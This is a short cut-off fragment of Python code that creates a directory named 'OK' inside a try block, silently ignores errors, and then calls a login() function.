	except:pass
	try:os.mkdir('OK')
	except:pass
	login()